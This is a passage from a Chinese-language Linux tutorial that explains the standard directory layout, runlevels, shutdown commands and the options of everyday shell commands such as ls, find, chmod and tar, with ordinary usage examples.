~guest：则代表用户名为guest的家目录。\n\n\n&#x2F;lib\n系统的函式库非常的多，而&#x2F;lib放置的则是在开机时会用到的函式库，以及在&#x2F;bin或&#x2F;sbin底下的指令会呼叫的函式库而已 。 什么是函式库呢？妳可以将他想成是外挂，某些指令必须要有这些外挂才能够顺利完成程式的执行之意。 尤其重要的是&#x2F;lib&#x2F;modules&#x2F;这个目录，因为该目录会放置核心相关的模组(驱动程式)。\n\n\n&#x2F;media\nmedia是媒体的英文，顾名思义，这个&#x2F;media底下放置的就是可移除的装置。 包括软碟、光碟、DVD等等装置都暂时挂载于此。 常见的档名有：&#x2F;media&#x2F;floppy, &#x2F;media&#x2F;cdrom等等。\n\n\n&#x2F;mnt\n如果妳想要暂时挂载某些额外的装置，一般建议妳可以放置到这个目录中。在古早时候，这个目录的用途与&#x2F;media相同啦。 只是有了&#x2F;media之后，这个目录就用来暂时挂载用了。\n\n\n&#x2F;opt\n这个是给第三方协力软体放置的目录 。 什么是第三方协力软体啊？举例来说，KDE这个桌面管理系统是一个独立的计画，不过他可以安装到Linux系统中，因此KDE的软体就建议放置到此目录下了。 另外，如果妳想要自行安装额外的软体(非原本的distribution提供的)，那么也能够将你的软体安装到这里来。 不过，以前的Linux系统中，我们还是习惯放置在&#x2F;usr&#x2F;local目录下。\n\n\n&#x2F;root\n系统管理员(root)的家目录。 之所以放在这里，是因为如果进入单人维护模式而仅挂载根目录时，该目录就能够拥有root的家目录，所以我们会希望root的家目录与根目录放置在同一个分区中。\n\n\n&#x2F;sbin\nLinux有非常多指令是用来设定系统环境的，这些指令只有root才能够利用来设定系统，其他使用者最多只能用来查询而已。放在&#x2F;sbin底下的为开机过程中所需要的，里面包括了开机、修复、还原系统所需要的指令。至于某些伺服器软体程式，一般则放置到&#x2F;usr&#x2F;sbin&#x2F;当中。至于本机自行安装的软体所产生的系统执行档(system binary)，则放置到&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;当中了。常见的指令包括：fdisk, fsck, ifconfig, init, mkfs等等。\n\n\n&#x2F;srv\nsrv可以视为service的缩写，是一些网路服务启动之后，这些服务所需要取用的资料目录。 常见的服务例如WWW, FTP等等。 举例来说，WWW伺服器需要的网页资料就可以放置在&#x2F;srv&#x2F;www&#x2F;里面。呵呵，看来平时我们编写的代码应该放到这里了。\n\n\n&#x2F;tmp\n这是让一般使用者或者是正在执行的程序暂时放置档案的地方。这个目录是任何人都能够存取的，所以你需要定期的清理一下。当然，重要资料不可放置在此目录啊。 因为FHS甚至建议在开机时，应该要将&#x2F;tmp下的资料都删除。\n\n\n事实上FHS针对根目录所定义的标准就仅限于上表，不过仍旧有些目录也需要我们了解一下，具体如下：\n\n\n\n目录\n应放置文件内容\n\n\n\n&#x2F;lost+found\n这个目录是使用标准的ext2&#x2F;ext3档案系统格式才会产生的一个目录，目的在于当档案系统发生错误时，将一些遗失的片段放置到这个目录下。 这个目录通常会在分割槽的最顶层存在，例如你加装一个硬盘于&#x2F;disk中，那在这个系统下就会自动产生一个这样的目录&#x2F;disk&#x2F;lost+found\n\n\n&#x2F;proc\n这个目录本身是一个虚拟文件系统(virtual filesystem)喔。 他放置的资料都是在内存当中，例如系统核心、行程资讯(process)（是进程吗?）、周边装置的状态及网络状态等等。因为这个目录下的资料都是在记忆体（内存）当中，所以本身不占任何硬盘空间。比较重要的档案（目录）例如： &#x2F;proc&#x2F;cpuinfo, &#x2F;proc&#x2F;dma, &#x2F;proc&#x2F;interrupts, &#x2F;proc&#x2F;ioports, &#x2F;proc&#x2F;net&#x2F;*，&#x2F;proc&#x2F;meminfo查看内存信息\n\n\n&#x2F;sys\n这个目录其实跟&#x2F;proc非常类似，也是一个虚拟的档案系统，主要也是记录与核心相关的资讯。 包括目前已载入的核心模组与核心侦测到的硬体装置资讯等等。 这个目录同样不占硬盘容量。\n\n\n除了这些目录的内容之外，另外要注意的是，因为根目录与开机有关，开机过程中仅有根目录会被挂载， 其他分区则是在开机完成之后才会持续的进行挂载的行为。就是因为如此，因此根目录下与开机过程有关的目录， 就不能够与根目录放到不同的分区去。那哪些目录不可与根目录分开呢？有底下这些：\n\n&#x2F;etc：配置文件\n\n&#x2F;bin：重要执行档\n\n&#x2F;dev：所需要的装置文件\n\n&#x2F;lib：执行档所需的函式库与核心所需的模块\n\n&#x2F;sbin：重要的系统执行文件\n\n\n这五个目录千万不可与根目录分开在不同的分区。\n通常情况下，我们可以使用&#x2F;opt和&#x2F;home目录，这两个目录均是由用户自由处理的，不存在敏感文件，也可以将程序安装在&#x2F;opt&#x2F;目录下，默认情况下，程序安装路径会在&#x2F;usr&#x2F;bin或&#x2F;var目录下\n&#x2F;usr 的意义与内容：\n依据FHS的基本定义，&#x2F;usr里面放置的数据属于可分享的与不可变动的(shareable, static)， 如果你知道如何透过网络进行分区的挂载(例如在服务器篇会谈到的NFS服务器)，那么&#x2F;usr确实可以分享给局域网络内的其他主机来使用喔。\n&#x2F;usr不是user的缩写，其实usr是Unix Software Resource的缩写， 也就是Unix操作系统软件资源所放置的目录，而不是用户的数据啦。这点要注意。 FHS建议所有软件开发者，应该将他们的数据合理的分别放置到这个目录下的次目录，而不要自行建立该软件自己独立的目录。\n因为是所有系统默认的软件(distribution发布者提供的软件)都会放置到&#x2F;usr底下，因此这个目录有点类似Windows 系统的C:\\Windows\\ + C:\\Program files\\这两个目录的综合体，系统刚安装完毕时，这个目录会占用最多的硬盘容量。 一般来说，&#x2F;usr的次目录建议有底下这些：\n\n\n\n目录\n应放置文件内容\n\n\n\n&#x2F;usr&#x2F;X11R6&#x2F;\n为X Window System重要数据所放置的目录，之所以取名为X11R6是因为最后的X版本为第11版，且该版的第6次释出之意。\n\n\n&#x2F;usr&#x2F;bin&#x2F;\n绝大部分的用户可使用指令都放在这里。请注意到他与&#x2F;bin的不同之处。(是否与开机过程有关)\n\n\n&#x2F;usr&#x2F;include&#x2F;\nc&#x2F;c++等程序语言的档头(header)与包含档(include)放置处，当我们以tarball方式 (*.tar.gz 的方式安装软件)安装某些数据时，会使用到里头的许多包含档。\n\n\n&#x2F;usr&#x2F;lib&#x2F;\n包含各应用软件的函式库、目标文件(object file)，以及不被一般使用者惯用的执行档或脚本(script)。 某些软件会提供一些特殊的指令来进行服务器的设定，这些指令也不会经常被系统管理员操作， 那就会被摆放到这个目录下啦。要注意的是，如果你使用的是X86_64的Linux系统， 那可能会有&#x2F;usr&#x2F;lib64&#x2F;目录产生\n\n\n&#x2F;usr&#x2F;local&#x2F;\n统管理员在本机自行安装自己下载的软件(非distribution默认提供者)，建议安装到此目录， 这样会比较便于管理。举例来说，你的distribution提供的软件较旧，你想安装较新的软件但又不想移除旧版， 此时你可以将新版软件安装于&#x2F;usr&#x2F;local&#x2F;目录下，可与原先的旧版软件有分别啦。 你可以自行到&#x2F;usr&#x2F;local去看看，该目录下也是具有bin, etc, include, lib…的次目录\n\n\n&#x2F;usr&#x2F;sbin&#x2F;\n非系统正常运作所需要的系统指令。最常见的就是某些网络服务器软件的服务指令(daemon)\n\n\n&#x2F;usr&#x2F;share&#x2F;\n放置共享文件的地方，在这个目录下放置的数据几乎是不分硬件架构均可读取的数据， 因为几乎都是文本文件嘛。在此目录下常见的还有这些次目录：&#x2F;usr&#x2F;share&#x2F;man：联机帮助文件&#x2F;usr&#x2F;share&#x2F;doc：软件杂项的文件说明&#x2F;usr&#x2F;share&#x2F;zoneinfo：与时区有关的时区文件\n\n\n&#x2F;usr&#x2F;src&#x2F;\n一般原始码建议放置到这里，src有source的意思。至于核心原始码则建议放置到&#x2F;usr&#x2F;src&#x2F;linux&#x2F;目录下。\n\n\n&#x2F;var 的意义与内容：\n如果&#x2F;usr是安装时会占用较大硬盘容量的目录，那么&#x2F;var就是在系统运作后才会渐渐占用硬盘容量的目录。 因为&#x2F;var目录主要针对常态性变动的文件，包括缓存(cache)、登录档(log file)以及某些软件运作所产生的文件， 包括程序文件(lock file, run file)，或者例如MySQL数据库的文件等等。常见的次目录有：\n\n\n\n目录\n应放置文件内容\n\n\n\n&#x2F;var&#x2F;cache&#x2F;\n应用程序本身运作过程中会产生的一些暂存档\n\n\n&#x2F;var&#x2F;lib&#x2F;\n程序本身执行的过程中，需要使用到的数据文件放置的目录。在此目录下各自的软件应该要有各自的目录。 举例来说，MySQL的数据库放置到&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;而rpm的数据库则放到&#x2F;var&#x2F;lib&#x2F;rpm去\n\n\n&#x2F;var&#x2F;lock&#x2F;\n某些装置或者是文件资源一次只能被一个应用程序所使用，如果同时有两个程序使用该装置时， 就可能产生一些错误的状况，因此就得要将该装置上锁(lock)，以确保该装置只会给单一软件所使用。 举例来说，刻录机正在刻录一块光盘，你想一下，会不会有两个人同时在使用一个刻录机烧片？ 如果两个人同时刻录，那片子写入的是谁的数据？所以当第一个人在刻录时该刻录机就会被上锁， 第二个人就得要该装置被解除锁定(就是前一个人用完了)才能够继续使用\n\n\n&#x2F;var&#x2F;log&#x2F;\n非常重要。这是登录文件放置的目录。里面比较重要的文件如&#x2F;var&#x2F;log&#x2F;messages, &#x2F;var&#x2F;log&#x2F;wtmp(记录登入者的信息)等。\n\n\n&#x2F;var&#x2F;mail&#x2F;\n放置个人电子邮件信箱的目录，不过这个目录也被放置到&#x2F;var&#x2F;spool&#x2F;mail&#x2F;目录中，通常这两个目录是互为链接文件。\n\n\n&#x2F;var&#x2F;run&#x2F;\n某些程序或者是服务启动后，会将他们的PID放置在这个目录下\n\n\n&#x2F;var&#x2F;spool&#x2F;\n这个目录通常放置一些队列数据，所谓的“队列”就是排队等待其他程序使用的数据。 这些数据被使用后通常都会被删除。举例来说，系统收到新信会放置到&#x2F;var&#x2F;spool&#x2F;mail&#x2F;中， 但使用者收下该信件后该封信原则上就会被删除。信件如果暂时寄不出去会被放到&#x2F;var&#x2F;spool&#x2F;mqueue&#x2F;中， 等到被送出后就被删除。如果是工作排程数据(crontab)，就会被放置到&#x2F;var&#x2F;spool&#x2F;cron&#x2F;目录中。\n\n\nLinux的启动级别Linux下一共有七个启动级别（0-6）\n切换启动级别使用的命令是init\n语法：init 启动级别号\n文件/etc/inittab:设置默认启动级别\n启动级别分别是：\n\n0   系统停机模式，系统默认运行级别不能设置为0，不然的话是没办法正常启动的，这个启动级别下， 机器就是关机的状态 \n1   单用户模式，有root权限，用于系统的维护，禁止远程登录，没有网络功能，就像windows的安全模式 \n2   多用户模式，没有NFS和网络的支持 \n3   完整的多用户文本模式，有NFS和网络，登录后进入控制台的命令行模式 ,代表命令行界面，即文本界面，是企业中服务器通用的启动模式\n4   系统未使用，保留，一般不用，在一些特殊情况下可以用它来做一些事情。比如说，笔记本电脑电池将 要用尽时，可以切换到这个模式来做一些设置 \n5   图形化模式，登陆后进入图形GUI模式 ,代表图形界面，也是Linux系统启动时带GUI的默认启动模式\n6   重启模式，默认运行级别不能设置为6，否则系统会无限重启，不能正常启动。运行init 6 机器就会重启\n\nLinux的关机与重启\n\n\n命令实例\n作用\n\n\n\nreboot\n重启\n\n\nshutdown -r now\n现在立刻重启\n\n\nshutdown -r 11:30\n等到11:30进行重启\n\n\nshutdown -r +1\n等一分钟后重启\n\n\nhalt\n关机\n\n\nshutdown -h now\n现在立刻关闭系统\n\n\nshutdown -h 11:30\n等到11:30关闭系统\n\n\ninit 0\n关机\n\n\ninit 6\n重启\n\n\nLinux常见命令使用top命令类似于Windows的任务管理器，可以查看CPU和内存等使用情况，也可以查看每个进程所消耗CPU和内存,及进程ID等信息。\n直接输入top如下图,可直接看到资源使用情况\n\n按q或者ctrl+c退出\nls命令就是 list 的缩写，通过 ls 命令不仅可以查看 linux 文件夹包含的文件，而且可以查看文件权限(包括目录、文件夹、文件权限)查看目录信息等等。\nls -a 列出目录所有文件，包含以.开始的隐藏文件\nls -A 列出除.及..的其它文件\nls -r 反序排列\nls -t 以文件修改时间排序\nls -S 以文件大小排序\nls -h 以易读大小显示\nls -l 除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来\n\ncd 命令cd(changeDirectory) 命令语法：\ncd [目录名]\n说明：切换当前目录至 dirName。\n（1）进入根目录\ncd &#x2F;\n（2）进入 &quot;home&quot; 目录\ncd &#x2F;home\n（3）进入上一次工作路径\ncd -\n（4）把上个命令的参数作为cd参数使用。\ncd !$\n\n注:\ncd ~~ 代表的就是 &#x2F;home&#x2F;user&#x2F;\n~ 表示代码主目录，也就是当前登录用户的用户目录。\npwd 命令pwd 命令用于查看当前工作目录路径。\n1）查看当前路径\npwd\n（2）查看软链接的实际路径\npwd -P\n\nmkdir 命令mkdir 命令用于创建文件夹。\n可用选项：\n\n-m: 对新建目录设置存取权限，也可以用 chmod 命令设置;\n-p: 可以是一个路径名称。此时若路径中的某些目录尚不存在,加上此选项后，系统将自动建立好那些尚不在的目录，即一次可以建立多个目录。\n\n(1）当前工作目录下创建名为 t的文件夹\nmkdir t\n（2）在 tmp 目录下创建路径为 test&#x2F;t1&#x2F;t 的目录，若不存在，则创建：\nmkdir -p &#x2F;tmp&#x2F;test&#x2F;t1&#x2F;t\n\nrm命令Linux rm（英文全拼：remove）命令用于删除一个文件或者目录。\nrm [options] name...\n\n\n-i 删除前逐一询问确认。\n-f 即使原档案属性设为唯读，亦直接删除，无需逐一确认。\n-r 将目录及以下之档案亦逐一删除。\n\n# rm  test.txt \nrm：是否删除 一般文件 &quot;test.txt&quot;? y  \n# rm  homework  \nrm: 无法删除目录&quot;homework&quot;: 是一个目录  \n# rm  -r  homework  \nrm：是否删除 目录 &quot;homework&quot;? y \n\n删除文件可以直接使用rm命令，若删除目录则必须配合选项”-r”\nmv 命令移动文件或修改文件名，根据第二参数类型（如目录，则移动文件；如为文件则重命令该文件）。\n当第二个参数为目录时，第一个参数可以是多个以空格分隔的文件或目录，然后移动第一个参数指定的多个文件到第二个参数指定的目录中。\n语法\nmv [options] source dest\nmv [options] source... directory\n\n参数说明：\n\n-b: 当目标文件或目录存在时，在执行覆盖前，会为其创建一个备份。\n-i: 如果指定移动的源目录或文件与目标的目录或文件同名，则会先询问是否覆盖旧文件，输入 y 表示直接覆盖，输入 n 表示取消该操作。\n-f: 如果指定移动的源目录或文件与目标的目录或文件同名，不会询问，直接覆盖旧文件。\n-n: 不要覆盖任何已存在的文件或目录。\n-u：当源文件比目标文件新或者目标文件不存在时，才执行移动操作。\n\nmv 参数设置与运行结果\n\n\n\n命令格式\n运行结果\n\n\n\nmv source_file(文件) dest_file(文件)\n将源文件名 source_file 改为目标文件名 dest_file\n\n\nmv source_file(文件) dest_directory(目录)\n将文件 source_file 移动到目标目录 dest_directory 中\n\n\nmv source_directory(目录) dest_directory(目录)\n目录名 dest_directory 已存在，将 source_directory 移动到目录名 dest_directory 中；目录名 dest_directory 不存在则 source_directory 改名为目录名 dest_directory\n\n\nmv source_directory(目录) dest_file(文件)\n出错\n\n\n实例\n将文件 aaa 改名为 bbb :\nmv aaa bbb\n将 info 目录放入 logs 目录中。注意，如果 logs 目录不存在，则该命令将 info 改名为 logs。\nmv info&#x2F; logs \n再如将 &#x2F;usr&#x2F;runoob 下的所有文件和目录移到当前目录下，命令行为：\n$ mv &#x2F;usr&#x2F;runoob&#x2F;*  . \n\ncp 命令将源文件复制至目标文件，或将多个源文件复制至目标目录。\n注意：命令行复制，如果目标文件已经存在会提示是否覆盖，而在 shell 脚本中，如果不加 -i 参数，则不会提示，而是直接覆盖！\n-i 提示\n-r 复制目录及目录内所有项目\n-a 复制的文件与原文件时间一样\n\n实例\n(1）复制 a.txt 到 test 目录下，保持原文件时间，如果原文件存在提示是否覆盖。\ncp -ai a.txt test\n（2）为 a.txt 建立一个链接（快捷方式）\ncp -s a.txt link_a.txt\n\ncat命令cat（英文全拼：concatenate）命令用于连接文件并打印到标准输出设备上\n语法\ncat [-AbeEnstTuv] [--help] [--version] fileName\n\n参数\n-n 或 –number：由 1 开始对所有输出的行数编号。\n-b 或 –number-nonblank：和 -n 相似，只不过对于空白行不编号。\n-s 或 –squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行。\n-v 或 –show-nonprinting：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外。\n-E 或 –show-ends : 在每行结束处显示 $。\n-T 或 –show-tabs: 将 TAB 字符显示为 ^I。\n-A, –show-all：等价于 -vET。\n-e：等价于”-vE”选项；\n-t：等价于”-vT”选项；\n实例\n把 textfile1 的文档内容加上行号后输入 textfile2 这个文档里：\ncat -n textfile1 &gt; textfile2\n把 textfile1 和 textfile2 的文档内容加上行号（空白行不加）之后将内容附加到 textfile3 文档里：\ncat -b textfile1 textfile2 &gt;&gt; textfile3\n清空 &#x2F;etc&#x2F;test.txt 文档内容：\ncat &#x2F;dev&#x2F;null &gt; &#x2F;etc&#x2F;test.txt\ncat 也可以用来制作镜像文件。例如要制作软盘的镜像文件，将软盘放好后输入：\ncat &#x2F;dev&#x2F;fd0 &gt; OUTFILE\n相反的，如果想把 image file 写到软盘，输入：\ncat IMG_FILE &gt; &#x2F;dev&#x2F;fd0\n\nmore 命令功能类似于 cat, more 会以一页一页的显示方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示。\n命令参数：\n+n      从笫 n 行开始显示\n-n       定义屏幕大小为n行\n+&#x2F;pattern 在每个档案显示前搜寻该字串（pattern），然后从该字串前两行之后开始显示 \n-c       从顶部清屏，然后显示\n-d       提示“Press space to continue，’q’ to quit（按空格键继续，按q键退出）”，禁用响铃功能\n-l        忽略Ctrl+l（换页）字符\n-p       通过清除窗口而不是滚屏来对文件进行换页，与-c选项相似\n-s       把连续的多个空行显示为一行\n-u       把文件内容中的下画线去掉\n\n常用操作命令：\nEnter    向下 n 行，需要定义。默认为 1 行\nCtrl+F   向下滚动一屏\n空格键  向下滚动一屏\nCtrl+B  返回上一屏\n&#x3D;       输出当前行的行号\n:f     输出文件名和当前行的行号\nV      调用vi编辑器\n!命令   调用Shell，并执行命令\nq       退出more\n\n实例：\n（1）显示文件中从第3行起的内容\nmore +3 text.txt\n\n（2）在所列出文件目录详细信息，借助管道使每次显示 5 行\nls -l | more -5\n\n按空格显示下 5 行。\nless 命令less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。\n常用命令参数：\n-i  忽略搜索时的大小写\n-N  显示每行的行号\n-o  &lt;文件名&gt; 将less 输出的内容在指定文件中保存起来\n-s  显示连续空行为一行\n&#x2F;字符串：向下搜索“字符串”的功能\n?字符串：向上搜索“字符串”的功能\nn：重复前一个搜索（与 &#x2F; 或 ? 有关）\nN：反向重复前一个搜索（与 &#x2F; 或 ? 有关）\n-x &lt;数字&gt; 将“tab”键显示为规定的数字空格\nb  向后翻一页\nd  向后翻半页\nh  显示帮助界面\nQ  退出less 命令\nu  向前滚动半页\ny  向前滚动一行\n空格键 滚动一行\n回车键 滚动一页\n[pagedown]： 向下翻动一页\n[pageup]：   向上翻动一页\n\n实例：\n（1）ps 查看进程信息并通过 less 分页显示\nps -aux | less -N\n\n（2）查看多个文件\nless 1.log 2.log\n\n可以使用 n 查看下一个，使用 p 查看前一个。\nhead 命令head 用来显示档案的开头至标准输出中，默认 head 命令打印其相应文件的开头 10 行。\n常用参数：\n-n&lt;行数&gt; 显示的行数（行数为复数表示从最后向前数）\n\n实例：\n（1）显示 1.log 文件中前 20 行\nhead 1.log -n 20\n\n（2）显示 1.log 文件前 20 字节\nhead -c 20 log2014.log\n\n（3）显示 t.log最后 10 行\nhead -n -10 t.log\n\ntail 命令用于显示指定文件末尾内容，不指定文件时，作为输入信息进行处理。常用查看日志文件。\n常用参数：\n-f 循环读取（常用于查看递增的日志文件）\n-n&lt;行数&gt; 显示行数（从后向前）\n\n（1）循环读取逐渐增加的文件内容\nping 127.0.0.1 &gt; ping.log &amp;\n\n后台运行：可使用 jobs -l 查看，也可使用 fg 将其移到前台运行。\ntail -f ping.log\n\n（查看日志）\ntail -f 文本文件表示通过流的方式实时查看最新的文件内容\nwhich 命令在 linux 要查找某个文件，但不知道放在哪里了，可以使用下面的一些命令来搜索：\nwhich     查看可执行文件的位置。\nwhereis 查看文件的位置。\nlocate  配合数据库查看文件位置。\nfind        实际搜寻硬盘查询文件名称。\n\nwhich 是在 PATH 就是指定的路径中，搜索某个系统命令的位置，并返回第一个搜索结果。使用 which 命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。\n常用参数：\n-n 　指定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名。\n\n实例：\n（1）查看 ls 命令是否存在，执行哪个\nwhich ls\n\n（2）查看 which\nwhich which\n\n（3）查看 cd\nwhich cd（显示不存在，因为 cd 是内建命令，而 which 查找显示是 PATH 中的命令）\n\n查看当前 PATH 配置：\necho $PATH\n\n或使用 env 查看所有环境变量及对应值\nwhereis 命令whereis 命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。whereis 及 locate 都是基于系统内建的数据库进行搜索，因此效率很高，而find则是遍历硬盘查找文件。\n常用参数：\n-b   定位可执行文件。\n-m   定位帮助文件。\n-s   定位源代码文件。\n-u   搜索默认路径下除可执行文件、源代码文件、帮助文件以外的其它文件。\n\n实例：\n（1）查找 locate 程序相关文件\nwhereis locate\n\n（2）查找 locate 的源码文件\nwhereis -s locate\n\n（3）查找 lcoate 的帮助文件\nwhereis -m locate\n\nlocate 命令locate 通过搜寻系统内建文档数据库达到快速找到档案，数据库由 updatedb 程序来更新，updatedb 是由 cron daemon 周期性调用的。默认情况下 locate 命令在搜寻数据库时比由整个由硬盘资料来搜寻资料来得快，但较差劲的是 locate 所找到的档案若是最近才建立或 刚更名的，可能会找不到，在内定值中，updatedb 每天会跑一次，可以由修改 crontab 来更新设定值 (etc&#x2F;crontab)。\nlocate 与 find 命令相似，可以使用如 *、? 等进行正则匹配查找\n常用参数：\n-l num（要显示的行数）\n-f   将特定的档案系统排除在外，如将proc排除在外\n-r   使用正则运算式做为寻找条件\n\n实例：\n（1）查找和 pwd 相关的所有文件(文件名中包含 pwd）\nlocate pwd\n\n（2）搜索 etc 目录下所有以 sh 开头的文件\nlocate &#x2F;etc&#x2F;sh\n\n（3）查找 &#x2F;var 目录下，以 reason 结尾的文件\nlocate -r &#39;^&#x2F;var.*reason$&#39;（其中.表示一个字符，*表示任务多个；.*表示任意多个字符）\n\nfind 命令用于在文件树中查找文件，并作出相应的处理。\n命令格式：\nfind pathname -options [-print -exec -ok ...]\n\n命令参数：\npathname: find命令所查找的目录路径。例如用.来表示当前目录，用&#x2F;来表示系统根目录。\n-print： find命令将匹配的文件输出到标准输出。\n-exec： find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为&#39;command&#39; &#123;  &#125; \\;，注意&#123;   &#125;和\\；之间的空格。\n-ok： 和-exec的作用相同，只不过以一种更为安全的模式来执行该参数所给出的shell命令，在执行每一个命令之前，都会给出提示，让用户来确定是否执行。\n\n命令选项：\n-name 按照文件名查找文件\n-perm 按文件权限查找文件\n-user 按文件属主查找文件\n-group  按照文件所属的组来查找文件。\n-type  查找某一类型的文件，诸如：\n   b - 块设备文件\n   d - 目录\n   c - 字符设备文件\n   l - 符号链接文件\n   p - 管道文件\n   f - 普通文件\n\n-size n :[c] 查找文件长度为n块文件，带有c时表文件字节大小\n-amin n   查找系统中最后N分钟访问的文件\n-atime n  查找系统中最后n*24小时访问的文件\n-cmin n   查找系统中最后N分钟被改变文件状态的文件\n-ctime n  查找系统中最后n*24小时被改变文件状态的文件\n-mmin n   查找系统中最后N分钟被改变文件数据的文件\n-mtime n  查找系统中最后n*24小时被改变文件数据的文件\n(用减号-来限定更改时间在距今n日以内的文件，而用加号+来限定更改时间在距今n日以前的文件。 )\n-maxdepth n 最大查找目录深度\n-prune 选项来指出需要忽略的目录。在使用-prune选项时要当心，因为如果你同时使用了-depth选项，那么-prune选项就会被find命令忽略\n-newer 如果希望查找更改时间比某个文件新但比另一个文件旧的所有文件，可以使用-newer选项\n\n实例：\n（1）查找 48 小时内修改过的文件\nfind -atime -2\n\n（2）在当前目录查找 以 .log 结尾的文件。 . 代表当前目录\nfind .&#x2F; -name &#39;*.log&#39;\n\n（3）查找 &#x2F;opt 目录下 权限为 777 的文件\nfind &#x2F;opt -perm 777\n\n（4）查找大于 1K 的文件\nfind -size +1000c\n\n查找等于 1000 字符的文件\nfind -size 1000c \n\n-exec 参数后面跟的是 command 命令，它的终止是以 ; 为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。{} 花括号代表前面find查找出来的文件名。\n实例：\n（5）在当前目录中查找更改时间在10日以前的文件并删除它们(无提醒）\nfind . -type f -mtime +10 -exec rm -f &#123;&#125; \\;\n\n（6）当前目录中查找所有文件名以.log结尾、更改时间在5日以上的文件，并删除它们，只不过在删除之前先给出提示。 按y键删除文件，按n键不删除\nfind . -name &#39;*.log&#39; mtime +5 -ok -exec rm &#123;&#125; \\;\n\n（7）当前目录下查找文件名以 passwd 开头，内容包含 “pkg” 字符的文件\nfind . -f -name &#39;passwd*&#39; -exec grep &quot;pkg&quot; &#123;&#125; \\;\n\n（8）用 exec 选项执行 cp 命令\nfind . -name &#39;*.log&#39; -exec cp &#123;&#125; test3 \\;\n\n-xargs find 命令把匹配到的文件传递给 xargs 命令，而 xargs 命令每次只获取一部分文件而不是全部，不像 -exec 选项那样。这样它可以先处理最先获取的一部分文件，然后是下一批，并如此继续下去。\n实例：\n（9）查找当前目录下每个普通文件，然后使用 xargs 来判断文件类型\nfind . -type f -print | xargs file\n\n（10）查找当前目录下所有以 js 结尾的并且其中包含 ‘editor’ 字符的普通文件\nfind . -type f -name &quot;*.js&quot; -exec grep -lF &#39;ueditor&#39; &#123;&#125; \\;\nfind -type f -name &#39;*.js&#39; | xargs grep -lF &#39;editor&#39;\n\n（11）利用 xargs 执行 mv 命令\nfind . -name &quot;*.log&quot; | xargs -i mv &#123;&#125; test4\n\n（12）用 grep 命令在当前目录下的所有普通文件中搜索 hostnames 这个词，并标出所在行：\nfind . -name \\*(转义） -type f -print | xargs grep -n &#39;hostnames&#39;\n\n（13）查找当前目录中以一个小写字母开头，最后是 4 到 9 加上 .log 结束的文件：\nfind . -name &#39;[a-z]*[4-9].log&#39; -print\n\n（14）在 test 目录查找不在 test4 子目录查找\nfind test -path &#39;test&#x2F;test4&#39; -prune -o -print\n\n（15）实例1：查找更改时间比文件 log2012.log新但比文件 log2017.log 旧的文件\nfind -newer log2012.log ! -newer log2017.log\n\n使用 depth 选项：\ndepth 选项可以使 find 命令向磁带上备份文件系统时，希望首先备份所有的文件，其次再备份子目录中的文件。\n实例：find 命令从文件系统的根目录开始，查找一个名为 CON.FILE 的文件。 它将首先匹配所有的文件然后再进入子目录中查找\nfind &#x2F; -name &quot;CON.FILE&quot; -depth -print\n\nchmod 命令用于改变 linux 系统文件或目录的访问权限。用它控制文件或目录的访问权限。该命令有两种用法。一种是包含字母和操作符表达式的文字设定法；另一种是包含数字的数字设定法。\n每一文件或目录的访问权限都有三组，每组用三位表示，分别为文件属主的读、写和执行权限；与属主同组的用户的读、写和执行权限；系统中其他用户的读、写和执行权限。可使用 ls -l test.txt 查找。\n以文件 log2012.log 为例：\n-rw-r--r-- 1 root root 296K 11-13 06:03 log2012.log\n\n第一列共有 10 个位置，第一个字符指定了文件类型。在通常意义上，一个目录也是一个文件。如果第一个字符是横线，表示是一个非目录的文件。如果是 d，表示是一个目录。从第二个字符开始到第十个 9 个字符，3 个字符一组，分别表示了 3 组用户对文件或者目录的权限。权限字符用横线代表空许可，r 代表只读，w 代表写，x 代表可执行。\n常用参数：\n-c 当发生改变时，报告处理信息\n-R 处理指定目录以及其子目录下所有文件\n\n权限范围：\nu ：目录或者文件的当前的用户\ng ：目录或者文件的当前的群组\no ：除了目录或者文件的当前用户或群组之外的用户或者群组\na ：所有的用户及群组\n\n权限代号：\nr ：读权限，用数字4表示\nw ：写权限，用数字2表示\nx ：执行权限，用数字1表示\n- ：删除权限，用数字0表示\ns ：特殊权限\n\n实例：\n（1）增加文件 t.log 所有用户可执行权限\nchmod a+x t.log\n\n（2）撤销原来所有的权限，然后使拥有者具有可读权限,并输出处理信息\nchmod u&#x3D;r t.log -c\n\n（3）给 file 的属主分配读、写、执行(7)的权限，给file的所在组分配读、执行(5)的权限，给其他用户分配执行(1)的权限\nchmod 751 t.log -c（或者：chmod u&#x3D;rwx,g&#x3D;rx,o&#x3D;x t.log -c)\n\n（4）将 test 目录及其子目录所有文件添加可读权限\nchmod u+r,g+r,o+r -R text&#x2F; -c\n\n19、tar 命令\n用来压缩和解压文件。tar 本身不具有压缩功能，只具有打包功能，有关压缩及解压是调用其它的功能来完成。\n弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件\n常用参数：\n-c 建立新的压缩文件\n-f 指定压缩文件\n-r 添加文件到已经压缩文件包中\n-u 添加改了和现有的文件到压缩包中\n-x 从压缩包中抽取文件\n-t 显示压缩文件中的内容\n-z 支持gzip压缩\n-j 支持bzip2压缩\n-Z 支持compress解压文件\n-v 显示操作过程\n\n有关 gzip 及 bzip2 压缩:\ngzip 实例：压缩 gzip fileName .tar.gz 和.tgz  解压：gunzip filename.gz 或 gzip -d filename.gz\n          对应：tar zcvf filename.tar.gz     tar zxvf filename.tar.gz\n\nbz2实例：压缩 bzip2 -z filename .tar.bz2 解压：bunzip filename.bz2或bzip -d filename.bz2\n       对应：tar jcvf filename.tar.gz         解压：tar jxvf filename.tar.bz2\n\n实例：\n（1）将文件全部打包成 tar 包\ntar -cvf log.tar 